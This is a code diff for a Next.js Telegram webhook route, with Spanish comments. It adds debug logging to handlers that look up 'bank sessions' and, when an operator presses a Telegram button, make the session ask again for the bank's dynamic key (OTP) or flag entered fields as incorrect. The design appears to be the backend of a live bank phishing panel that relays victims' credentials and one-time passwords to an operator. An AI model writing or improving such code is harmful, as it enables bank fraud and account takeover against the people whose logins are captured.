@@ -5,11 +5,13 @@ import { sendToTelegram } from '@/lib/telegram';
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
+    console.log('📩 Webhook received:', JSON.stringify(body, null, 2));
     
     // Manejar callback queries (botones)
     if (body.callback_query) {
       const callbackData = body.callback_query.data;
       const chatId = body.callback_query.message.chat.id;
+      console.log('🔘 Button pressed:', callbackData);
       
       // Parsear el callback_data: "incorrect_campo_sessionId"
       const parts = callbackData.split('_');
@@ -18,15 +20,18 @@ export async function POST(request: NextRequest) {
       if (action === 'request' && parts[1] === 'otp') {
         // Solicitar clave dinámica de nuevo
         const sessionId = parts.slice(2).join('_');
+        console.log('🔄 Requesting OTP for session:', sessionId);
         
         const session = await prisma.bankSession.findUnique({
           where: { sessionId }
         });
         
         if (!session) {
+          console.log('❌ Session not found:', sessionId);
           return NextResponse.json({ error: 'Session not found' }, { status: 404 });
         }
         
+        console.log('✅ Session found, updating to waiting_otp');
         // Cambiar estado para solicitar OTP nuevamente y limpiar la dinámica actual
         const updatedSession = await prisma.bankSession.update({
           where: { sessionId },
@@ -36,6 +41,7 @@ export async function POST(request: NextRequest) {
             dinamicaIncorrecta: false // No marcar como incorrecta, solo solicitar de nuevo
           }
         });
+        console.log('✅ Session updated:', updatedSession.status);
         
         // Actualizar mensaje de Telegram
         if (session.telegramMessageId) {
